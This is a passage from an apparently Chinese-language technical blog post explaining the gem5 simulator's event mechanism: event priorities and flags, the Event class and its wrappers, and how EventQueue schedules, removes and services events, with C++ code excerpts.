出来</td><td>31</td></tr><tr><td>Serialize_Pri</td><td>序列化操作优先级</td><td>32</td></tr><tr><td>CPU_Tick_Pri</td><td>CPU 下一拍优先级，必须在所有CPU事件后触发</td><td>50</td></tr><tr><td>CPU_Exit_Pri</td><td>CPU 退出线程优先级</td><td>64</td></tr><tr><td>Stat_Event_Pri</td><td>输出统计信息的优先级，肯定在所有实质事件之后</td><td>90</td></tr><tr><td>Progress_Event_Pri</td><td>模拟的进程事件</td><td>95</td></tr><tr><td>Sim_Exit_Pri</td><td>标记模拟结束的事件</td><td>100</td></tr></tbody></table><h3 id="标志位">标志位</h3><p>此外，EventBase 类还定义了一部分标志位，这些标志位要么是规定了用户的权限（可读或可写），要么是记录了事件处于的某种状态（squashed或Scheduled），也记录在此：</p><table><thead><tr><th>标志位</th><th>描述</th><th>常值</th></tr></thead><tbody><tr><td>PublicRead</td><td>表示最低的6位是可被公开读的标志位</td><td>0x003f</td></tr><tr><td>PublicWrite</td><td>表示可被公开写的标志位</td><td>0x001d</td></tr><tr><td>Squashed</td><td>表示该事件已经 squashed</td><td>0x0001</td></tr><tr><td>Scheduled</td><td>表示事件已经被调度，该位不可公开写</td><td>0x0002</td></tr><tr><td>Managed</td><td>Use life cycle manager</td><td>0x0004</td></tr><tr><td>AutoDelete</td><td>标志该事件 process() 后自动删除</td><td>0x0004</td></tr><tr><td>Reserved</td><td>该位被保留，预备后续使用</td><td>0x0008</td></tr><tr><td>IsExitEvent</td><td>标识该事件是否为 exit_event</td><td>0x0010</td></tr><tr><td>IsMainQueue</td><td>标识该事件是否位于main_queue</td><td>0x0020</td></tr><tr><td>Initialized</td><td>somewhat random bits</td><td>0x7a40</td></tr><tr><td>InitMask</td><td>初始化位的掩码</td><td>0xffc0</td></tr></tbody></table><h2 id="Event-类">Event 类</h2><h3 id="核心实现">核心实现</h3><p>事件类 Event 是 Gem5 中的核心类，是所有事件的父类。该类继承自 Serializable 类（这今后再详聊）和 EventBase 类。此外，Event 类为抽象类，内含有一个纯虚函数 <code>process()</code>，通常程序员需要通过 Event 的派生类来创建事件对象。但在此之前，我们必须深入了解该类的运行机制。下面列出 Event 类中一些重要的成员。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Event</span> : <span class="hljs-keyword">public</span> EventBase, <span class="hljs-keyword">public</span> Serializable &#123;<br>  Event *nextBin;  <span class="hljs-comment">// Bin defined as when+priority</span><br>  Event *nextInBin;<br>  Tick _when;    <span class="hljs-comment">// timestamp when event should be processed</span><br>  Priority _priority; <span class="hljs-comment">//!&lt; event priority</span><br>  Flags flags;<br>  Counter instance;  <span class="hljs-comment">// event unique ID</span><br>  EventQueue *queue;<br><br>  <span class="hljs-function"><span class="hljs-type">static</span> Event *<span class="hljs-title">insertBefore</span><span class="hljs-params">(Event *event, Event *curr)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">static</span> Event *<span class="hljs-title">removeItem</span><span class="hljs-params">(Event *event, Event *last)</span></span>;<br><br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">scheduled</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> flags.<span class="hljs-built_in">isSet</span>(Scheduled); &#125;<br>  <br>  <span class="hljs-comment">// Managed event scheduled and being held in the event queue.</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">acquire</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">if</span> (flags.<span class="hljs-built_in">isSet</span>(Event::Managed))  <span class="hljs-built_in">acquireImpl</span>(); &#125;<br><br>  <span class="hljs-comment">// Managed event removed from the event queue.</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">release</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">if</span> (flags.<span class="hljs-built_in">isSet</span>(Event::Managed))  <span class="hljs-built_in">releaseImpl</span>(); &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setWhen</span><span class="hljs-params">(Tick when, EventQueue *q)</span></span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><p>抽象类 Event 描述了事件这一核心概念，因而它也是整个底层机制的核心实现类。上节提到事件本质是由特殊的回调函数和一组状态标志位组成的，这体现在实现中便是类 Event 内部预留的虚函数 <code>process()</code>，以及存有运行时刻 <code>_when</code>，优先级 <code>_priority</code>，标记位 <code>flags</code> 和用于维护二维链表的两个指针变量 <code>nextBin</code> 和 <code>nextInBin</code> 等，其中 <code>nextBin</code> 指向链表中下一项，而 <code>nextInBin</code> 指向 Bin （Bin = when + priority）相同的下一项事件。</p><p><img src="/img/gem5/gem5-1.png" alt=""></p><p>在 Gem5 中，每个事件在被处理时都有一个纯虚函数 <code>process()</code>。每个继承了 Event 类的子类都必须实现。在处理事件时，还需要注意其中的标志位，并随时注意调整 cycle 周期。此外，事件获取 <code>acquire()</code> 和释放 <code>release()</code> 时的动作也可以被子类重载实现。使用 <code>setwhen()</code> 可以设置事件被触发的时间，并被指定的队列。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setWhen</span><span class="hljs-params">(Tick when, EventQueue *q)</span> </span>&#123;<br>  _when = when;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NDEBUG</span><br>  queue = q;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> EVENTQ_DEBUG</span><br>  whenScheduled = <span class="hljs-built_in">curTick</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="派生类">派生类</h3><p>Event 类的使用场景多见于 EventQueue 类内的实现。前文提到，由于类 Event 为抽象类，程序员需要通过类 Event 的派生类来创建事件对象，其中有两个派生类最为常用。一个是类 EventFunctionWrapper，其内部封装了一个执行函数。而另一个派生类是模板类 EventWrapper，它可以封装一个模板类，从而提供更加灵活的执行机制。<strong>若用户要直接使用 Event 类包装另一个类的对象，可能 EventWrapper 类或者 EventFunctionWrapper 更加合适：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-built_in">void</span> (T::* F)()&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventWrapper</span> : <span class="hljs-keyword">public</span> Event &#123;<br>  <span class="hljs-keyword">private</span>:<br>    T *object;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">EventWrapper</span>(T *obj, <span class="hljs-type">bool</span> del = <span class="hljs-literal">false</span>, Priority p = Default_Pri)<br>      : <span class="hljs-built_in">Event</span>(p), <span class="hljs-built_in">object</span>(obj) &#123;<br>      <span class="hljs-keyword">if</span> (del)<br>        <span class="hljs-built_in">setFlags</span>(AutoDelete);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span> </span>&#123; (object-&gt;*F)(); &#125;<br>    <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventFunctionWrapper</span> : <span class="hljs-keyword">public</span> Event &#123;<br>  <span class="hljs-keyword">private</span>:<br>    std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">void</span>)&gt; callback;<br>    std::string _name;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">EventFunctionWrapper</span>(<span class="hljs-type">const</span> std::function&lt;<span class="hljs-built_in">void</span>(<span class="hljs-type">void</span>)&gt; &amp;callback, <span class="hljs-type">const</span> std::string &amp;name, <span class="hljs-type">bool</span> del = <span class="hljs-literal">false</span>, Priority p = Default_Pri)<br>      : <span class="hljs-built_in">Event</span>(p), <span class="hljs-built_in">callback</span>(callback), _name(name) &#123;<br>        <span class="hljs-keyword">if</span> (del)<br>          <span class="hljs-built_in">setFlags</span>(AutoDelete);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-built_in">callback</span>(); &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="EventQueue-类">EventQueue 类</h2><p>事件队列（EventQueue）是管理系统事件的重要载体，类 EventQueue 用于描述该事件队列，它将被调度的事件按执行时间排列，其中队列头是执行时间最早的事件，执行时间一致的按照优先级高低在另一个维度上排列，形成了一个二维链表。每个线程都会维护一个局部的事件队列，事件会在队列中被调度（即插入到队列中）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventQueue</span> &#123;<br>  Event *head;<br>  Tick _curTick;<br>  <span class="hljs-comment">//! Mutex to protect async queue.</span><br>  UncontendedMutex async_queue_mutex;<br>  <span class="hljs-comment">//! List of events added by other threads to this event queue.</span><br>  std::list&lt;Event*&gt; async_queue;<br>  <span class="hljs-comment">// taken when servicing events</span><br>  UncontendedMutex service_mutex;<br>&#125;<br></code></pre></td></tr></table></figure><p>async_queue 和 async_queue_mutex 用于管理多线程下异步事件队列，而真正的链表头是 head。</p><h3 id="Schedule">Schedule</h3><p>EventQueue 类重点还是在于 <code>schedule()</code> 函数，该函数负责事件调度，将创建好的事件插入到事件队列中，以备事件引擎执行。其参数是将要被执行的事件 <code>event</code> 和具体执行时间 <code>when</code>，global 参数用于判断队列是否被另一个线程运行。在 <code>schedule()</code> 中，设置完 event 的执行时间后，分成两个执行方式：同步插入和异步插入。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//! 当前的执行模式: parallel / serial</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">bool</span> inParallelMode;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">schedule</span><span class="hljs-params">(Event *event, Tick when, <span class="hljs-type">bool</span> global=<span class="hljs-literal">false</span>)</span> </span>&#123;<br>  event-&gt;<span class="hljs-built_in">setWhen</span>(when, <span class="hljs-keyword">this</span>);<br>  <span class="hljs-comment">// 两种模式:</span><br>  <span class="hljs-comment">// a. 异步插入：硬件线程将局部事件调度到一个不属于自己的其他队列 需要 `asyncq`.</span><br>  <span class="hljs-comment">// b. 全局调度：硬件线程将全局事件调度到 `asyncq` 需要维护全局事件的整体顺序</span><br>  <span class="hljs-comment">//    See global_event.&#123;cc,hh&#125; for more explanation.</span><br>  <span class="hljs-keyword">if</span> (inParallelMode &amp;&amp; (<span class="hljs-keyword">this</span> != <span class="hljs-built_in">curEventQueue</span>() || global)) &#123;<br>    <span class="hljs-comment">// 异步插入</span><br>    <span class="hljs-built_in">asyncInsert</span>(event);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 同步插入</span><br>    <span class="hljs-built_in">insert</span>(event);<br>  &#125;<br>  event-&gt;flags.<span class="hljs-built_in">set</span>(Event::Scheduled);<br>  event-&gt;<span class="hljs-built_in">acquire</span>();<br><br>  <span class="hljs-keyword">if</span> (debug::Event)<br>    event-&gt;<span class="hljs-built_in">trace</span>(<span class="hljs-string">&quot;scheduled&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="同步插入">同步插入</h4><p>同步事件的调度需要调用 <code>insert()</code> 函数，且此时 global 参数为 false。这是很简单的链表插入动作，插入在插入点之前，符合编程惯例。之前提到，EventQueue 队列是一个二级链表，是由一串串单链表的头节点组成的链表。从以下代码可知，在 in Bin 链表中，使用头插法插入了新节点，因此二级链表是 LIFO 的。</p>   <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Event *<span class="hljs-title">Event::insertBefore</span><span class="hljs-params">(Event *event, Event *curr)</span> </span>&#123;<br>  <span class="hljs-comment">// 当前没有事件，或者插入的事件比头部还早 event进入 top 链表 &#x27;in bin&#x27;</span><br>  <span class="hljs-keyword">if</span> (!curr || *event &lt; *curr) &#123;<br>    event-&gt;nextBin = curr;<br>    event-&gt;nextInBin = <span class="hljs-literal">NULL</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 头插法 因此 in Bin 链表是LIFO的</span><br>    event-&gt;nextBin = curr-&gt;nextBin;<br>    event-&gt;nextInBin = curr;<br>  &#125;<br>  <span class="hljs-keyword">return</span> event;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">EventQueue::insert</span><span class="hljs-params">(Event *event)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (!head || *event &lt;= *head) &#123;<br>    <span class="hljs-comment">// call insertBefore()</span><br>    head = Event::<span class="hljs-built_in">insertBefore</span>(event, head);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 首先找打事件应位于哪个 &#x27;in bin&#x27;</span><br>  Event *prev = head;<br>  Event *curr = head-&gt;nextBin;<br>  <span class="hljs-keyword">while</span> (curr &amp;&amp; *curr &lt; *event) &#123;<br>    prev = curr;<br>    curr = curr-&gt;nextBin;<br>  &#125;<br>  <span class="hljs-comment">// Note: this operation may render all nextBin pointers on the</span><br>  <span class="hljs-comment">// prev &#x27;in bin&#x27; list stale (except for the top one)</span><br>  prev-&gt;nextBin = Event::<span class="hljs-built_in">insertBefore</span>(event, curr);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="跨线程的事件调度">跨线程的事件调度</h4><p>跨线程的事件调度可采用异步事件的调度方案（即将事件调度到另一个线程的事件队列中），此时 global 参数设置为 true。采取该做法时，因为事件队列被另一个线程运行，为防止冲突，<code>asyncInsert()</code> 会将事件暂时插入到异步队列 <code>async_queue</code> 中。</p>   <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">EventQueue::asyncInsert</span><span class="hljs-params">(Event *event)</span> </span>&#123;<br>  async_queue_mutex.<span class="hljs-built_in">lock</span>();<br>  async_queue.<span class="hljs-built_in">push_back</span>(event);<br>  async_queue_mutex.<span class="hljs-built_in">unlock</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">EventQueue::handleAsyncInsertions</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">assert</span>(<span class="hljs-keyword">this</span> == <span class="hljs-built_in">curEventQueue</span>());<br>    async_queue_mutex.<span class="hljs-built_in">lock</span>();<br>    <span class="hljs-keyword">while</span> (!async_queue.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-built_in">insert</span>(async_queue.<span class="hljs-built_in">front</span>());<br>        async_queue.<span class="hljs-built_in">pop_front</span>();<br>    &#125;<br>    async_queue_mutex.<span class="hljs-built_in">unlock</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>最后在每个模拟循环（或barrier）的最后时刻，<code>async_queue</code> 中的事件会被全部取出，然后捯饬到真正的事件队列中（见上述 <code>handleAsyncInsertions()</code> 函数）。</p><p>若要直接跨线程和事件队列地调度事件，或者获取目标事件队列的锁，在 <code>schedule()</code> 之外，还需要有特殊的机制避免死锁。原理也很简单：线程必须先自动放弃当前手中的事件队列锁，才能获得新事件队列锁，确保每个线程至多获取一个事件队列锁。该功能由 ScopedMigration 类负责，它将事件从一个事件队列暂时移植到另一个队列中。</p>   <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Releasing the current queue, locking the new queue</span><br><span class="hljs-comment"> * and updating curEventQueue(). This can, for example</span><br><span class="hljs-comment"> * be useful when performing IO across thread event</span><br><span class="hljs-comment"> * queues when timing is not crucial (e.g., during fast</span><br><span class="hljs-comment"> * forwarding).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">ScopedMigration</span>(EventQueue *_new_eq, <span class="hljs-type">bool</span> _doMigrate = <span class="hljs-literal">true</span>)<br>  :<span class="hljs-built_in">new_eq</span>(*_new_eq), <span class="hljs-built_in">old_eq</span>(*<span class="hljs-built_in">curEventQueue</span>()),<br>  <span class="hljs-built_in">doMigrate</span>((&amp;new_eq != &amp;old_eq)&amp;&amp;_doMigrate) &#123;<br>    <span class="hljs-keyword">if</span> (doMigrate) &#123;<br>      old_eq.<span class="hljs-built_in">unlock</span>();<br>      new_eq.<span class="hljs-built_in">lock</span>();<br>      <span class="hljs-built_in">curEventQueue</span>(&amp;new_eq);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// Temporarily migrate execution to a different event queue.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventQueue</span>::ScopedMigration &#123;<br>  <span class="hljs-keyword">private</span>:<br>   EventQueue &amp;new_eq;<br>   EventQueue &amp;old_eq;<br>   <span class="hljs-type">bool</span> doMigrate;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Deschedule">Deschedule</h3><p>在 <code>schedule()</code> 函数的基础之上，还添加了 <code>reschedule()</code> 和 <code>deschedule()</code> 等函数，方便事件队列的调度管理。其中 <code>deschedule()</code> 函数牵扯到链表的删除，也是比较平凡的实现。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">EventQueue::remove</span><span class="hljs-params">(Event *event)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;event not found!&quot;</span>);<br>    <span class="hljs-comment">// deal with an event on the head&#x27;s &#x27;in bin&#x27; list (event has the same</span><br>    <span class="hljs-comment">// time as the head)</span><br>    <span class="hljs-keyword">if</span> (*head == *event) &#123;<br>        head = Event::<span class="hljs-built_in">removeItem</span>(event, head);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// Find the &#x27;in bin&#x27; list that this event belongs on</span><br>    Event *prev = head;<br>    Event *curr = head-&gt;nextBin;<br>    <span class="hljs-keyword">while</span> (curr &amp;&amp; *curr &lt; *event) &#123;<br>        prev = curr;<br>        curr = curr-&gt;nextBin;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!curr || *curr != *event)<br>        <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;event not found!&quot;</span>);<br>    prev-&gt;nextBin = Event::<span class="hljs-built_in">removeItem</span>(event, curr);<br>&#125;<br><br><span class="hljs-function">Event *<span class="hljs-title">Event::removeItem</span><span class="hljs-params">(Event *event, Event *top)</span> </span>&#123;<br>    Event *curr = top;<br>    Event *next = top-&gt;nextInBin;<br>    <span class="hljs-comment">// if we removed the top item, we need to handle things specially</span><br>    <span class="hljs-comment">// and just remove the top item, fixing up the next bin pointer of</span><br>    <span class="hljs-comment">// the new top item</span><br>    <span class="hljs-keyword">if</span> (event == top) &#123;<br>        <span class="hljs-keyword">if</span> (!next)<br>            <span class="hljs-keyword">return</span> top-&gt;nextBin;<br>        next-&gt;nextBin = top-&gt;nextBin;<br>        <span class="hljs-keyword">return</span> next;<br>    &#125;<br>    <span class="hljs-comment">// Since we already checked the current element, we&#x27;re going to</span><br>    <span class="hljs-comment">// keep checking event against the next element.</span><br>    <span class="hljs-keyword">while</span> (event != next) &#123;<br>        <span class="hljs-keyword">if</span> (!next)<br>            <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;event not found!&quot;</span>);<br><br>        curr = next;<br>        next = next-&gt;nextInBin;<br>    &#125;<br>    <span class="hljs-comment">// remove next from the &#x27;in bin&#x27; list since it&#x27;s what we&#x27;re looking for</span><br>    curr-&gt;nextInBin = next-&gt;nextInBin;<br>    <span class="hljs-keyword">return</span> top;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Service">Service</h3><p>现在我们来看一下 EventQueue 中，Event 是如何被执行的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Event *<span class="hljs-title">EventQueue::serviceOne</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-function">std::lock_guard&lt;EventQueue&gt; <span class="hljs-title">lock</span><span class="hljs-params">(*<span class="hljs-keyword">this</span>)</span></span>;<br>  Event *event = head;<br>  Event *next = head-&gt;nextInBin;<br>  event-&gt;flags.<span class="hljs-built_in">clear</span>(Event::Scheduled);<br><br>  <span class="hljs-keyword">if</span> (next) &#123;<br>    next-&gt;nextBin = head-&gt;nextBin;<br>    head = next;<br>  &#125; <span class="hljs-keyword">else</span> head = head-&gt;nextBin;<br>  <span class="hljs-keyword">if</span> (!event-&gt;<span class="hljs-built_in">squashed</span>()) &#123;<br>    <span class="hljs-comment">// forward current cycle to the time when this event occurs.</span><br>    <span class="hljs-built_in">setCurTick</span>(event-&gt;<span class="hljs-built_in">when</span>());<br>    <span class="hljs-keyword">if</span> (debug::Event)<br>      event-&gt;<span class="hljs-built_in">trace</span>(<span class="hljs-string">&quot;executed&quot;</span>);<br>    event-&gt;<span class="hljs-built_in">process</span>();<br>    <span class="hljs-keyword">if</span> (event-&gt;<span class="hljs-built_in">isExitEvent</span>()) &#123;<br>      <span class="hljs-built_in">assert</span>(!event-&gt;flags.<span class="hljs-built_in">isSet</span>(Event::Managed) ||<br>          !event-&gt;flags.<span class="hljs-built_in">isSet</span>(Event::IsMainQueue)); <span class="hljs-comment">// would be silly</span><br>      <span class="hljs-keyword">return</span> event;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span><br>      event-&gt;flags.<span class="hljs-built_in">clear</span>(Event::Squashed);<br>  event-&gt;<span class="hljs-built_in">release</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当调用 <code>ServiceOne()</code> 函数时，默认是处理 EventQueue 中的第一个事件，取出第一个事件 event 后，在判断其是否 squashed（被压缩、合并），若不是被压缩的，那么直接将时间调整至事件处理时刻（事件驱动），随后调用 <code>event-&gt;process()</code> ，若是，那么仅需要清除标志位即可。</p><p><strong>为降低用户使用难度，使用 EventManager 类来包装 EventQueue 类，包括常用的许多事件调度函数，而这些包装函数是 SimObject 类内经常调用的：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventManager</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    EventQueue *eventq;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">schedule</span><span class="hljs-params">(Event &amp;event, Tick when)</span> </span>&#123;<br>      eventq-&gt;<span class="hljs-built_in">schedule</span>(&amp;event, when);<br>    &#125;<br>  <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deschedule</span><span class="hljs-params">(Event &amp;event)</span> </span>&#123;<br>      eventq-&gt;<span class="hljs-built_in">deschedule</span>(&amp;event);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="对于创建事件的解释">对于创建事件的解释</h2><p>现在，再回到 HelloObject 类上来，HelloObject 类继承了 SimObject 类。值得注意的是，SimObject 类是 gem5 中最重要的类之一，几乎所有的系统组件，如 CPU 、总线、Cache 等都需要继承 SimObject 类。根据代码，SimObject 类继承了 EventManager 类，EventManager 类中包装了一个 EventQueue 对象。因此，在 <code>startup()</code> 函数中使用的 <code>schedule()</code> 函数本质就是调用了 <code>EventQueue::schedule()</code> 函数：将事件 event 放入事件队列中，等待被调度。</p><p>另外，EventFunctionWrapper 类是 Event 类的子类，该类建立起了回调函数与事件对象的联系，当事件被触发后，回调函数会被执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 